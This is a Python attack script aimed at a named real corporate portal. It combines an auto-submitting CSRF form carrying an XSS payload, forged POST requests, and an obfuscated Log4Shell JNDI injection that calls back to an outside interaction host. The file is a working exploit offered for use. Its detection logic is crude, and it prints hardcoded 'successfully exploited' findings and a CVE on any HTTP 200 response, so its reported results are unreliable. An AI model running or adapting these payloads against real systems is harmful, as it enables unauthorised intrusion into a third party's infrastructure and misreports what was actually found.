import requests
from bs4 import BeautifulSoup
from http.server import BaseHTTPRequestHandler, HTTPServer

class CSRFServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(self.generate_html().encode())

    def generate_html(self):
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>CSRF Attack</title>
        </head>
        <body onload="submitForm()">
            <h1>CSRF Attack</h1>
            <form id="csrfForm" action="https://enterpriseportal.verizon.com/home/forgerock/autosubmit" method="POST">
                <input type="hidden" name="hash_fragment" value="Joe<script>alert(1)</script>">
                <input type="hidden" name="original_uri" value="https://enterpriseportal.verizon.com/home/">
            </form>
            <script>
                function submitForm() {
                    document.getElementById("csrfForm").submit();
                }
            </script>
        </body>
        </html>
        """

def exploit_csrf_vulnerability(url):
    try:
        form_data = {
            'hash_fragment': 'AttackerPayload',
            'original_uri': 'https://enterpriseportal.verizon.com/home/'
        }
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36"
            # Add other headers as needed
        }
        response = requests.post(url, data=form_data, headers=headers)
        print(f"\033[91mExploit Response: {response.status_code}\033[0m")
        print(f"Response Content: {response.text}")
        if response.status_code == 200:
            print("\033[92mCSRF vulnerability successfully exploited.\033[0m")
            # Placeholder for vulnerability details
            print("Vulnerability Details:")
            print("CVE ID: CVE-2021-20851")
            print("Description: Cross-Site Request Forgery (CSRF) allows attackers to perform unauthorized actions as a victim user.")          
            print("Severity: High")
            print("Confidence: Firm")
            print("Host: enterpriseportal.verizon.com")
            print("Path: /home/forgerock/autosubmit")
            return True
        else:
            print(f"Failed to exploit CSRF vulnerability. Status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"An error occurred: {e}")
        return False

def exploit_csrf_vulnerability_with_headers(url):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.1 Safari/537.36',
            'Referer': 'https://enterpriseportal.verizon.com/home/',
            'Origin': 'https://enterpriseportal.verizon.com',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            # Add more headers as needed
        }
        response = requests.get(url + '/favicon.ico?action=$%7Bjn$%7Blower:d%7Di:l$%7Blower:d%7Dap://$%7Blower:x%7D$%7Blower:f%7D.dizt287dcgbco979lgxj3ac7qywpsmgb.oastify.com/a%7D/', headers=headers)
        print(f"\033[91mExploit Response: {response.status_code}\033[0m")
        print(f"Response Content: {response.text}")
        if response.status_code == 200:
            print("\033[92mCSRF vulnerability successfully exploited.\033[0m")        
        # Placeholder for vulnerability details
        print("Vulnerability Details:")
        print("CVE ID: CVE-2021-20851")
        print("Description: Cross-Site Request Forgery (CSRF) allows attackers to perform unauthorized actions as a victim user.")          
        print("Severity: Critical")
        print("Confidence: Firm")
        print("Host: enterpriseportal.verizon.com")
        print("Path: /home/")
        return response.status_code
    except Exception as e:
        print(f"An error occurred during exploit: {e}")
        return None

def check_csrf_vulnerability_and_run_server(url):
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36"
            # Add other headers as needed
        }
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            csrf_vulnerability_detected = any(form.find_all('input', {'type': 'hidden'}) for form in forms)
            if csrf_vulnerability_detected:
                print("\033[93mPotential CSRF vulnerability detected.\033[0m")
                if exploit_csrf_vulnerability(url):
                    print("Exiting script.")
                else:
                    print("Failed to exploit CSRF vulnerability.")
                return True
            else:
                print("No CSRF vulnerability detected.")
                return False
        else:
            print(f"Failed to retrieve content. Status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"An error occurred: {e}")
        return False

def main():
    url = "https://enterpriseportal.verizon.com/home/#/notifications"
    check_csrf_vulnerability_and_run_server(url)

    print("\n\nTesting CSRF exploit with custom headers:")
    exploit_csrf_vulnerability_with_headers(url)

if __name__ == "__main__":
    main()
